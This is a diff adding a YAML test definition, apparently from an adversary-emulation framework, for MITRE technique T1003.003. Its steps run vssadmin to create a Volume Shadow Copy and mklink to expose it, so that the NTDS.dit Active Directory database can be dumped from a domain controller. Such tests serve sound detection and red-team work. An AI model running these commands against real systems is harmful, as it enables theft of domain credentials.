@@ -1,0 +1,33 @@
+api_version: "2.0"
+name: Create Symlink to Volume Shadow Copy
+description: |
+    This test is intended to be run on a domain Controller.
+
+    The Active Directory database NTDS.dit may be dumped by creating a symlink to Volume Shadow Copy.
+args:
+    - name: drive_letter
+      type: string
+      default: 'C:'
+    - name: symlink_path
+      type: string
+      default: C:\Temp\vssstore
+uuid: 21748c28-2793-4284-9e07-d6d028b66702
+mitre:
+    tactics:
+        - 'TA0006: Credential Access'
+    techniques:
+        - 'T1003: OS Credential Dumping'
+    subtechniques:
+        - 'T1003.003: NTDS'
+requirements:
+    platforms:
+        - os: windows
+steps:
+    - name: create-symlink-to-volume-shadow-copy
+      inline: |
+        vssadmin.exe create shadow /for={{.Args.drive_letter}}
+        mklink /D {{.Args.symlink_path}} \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1
+      executor: command_prompt
+      cleanup:
+        inline: ""
+        executor: command_prompt
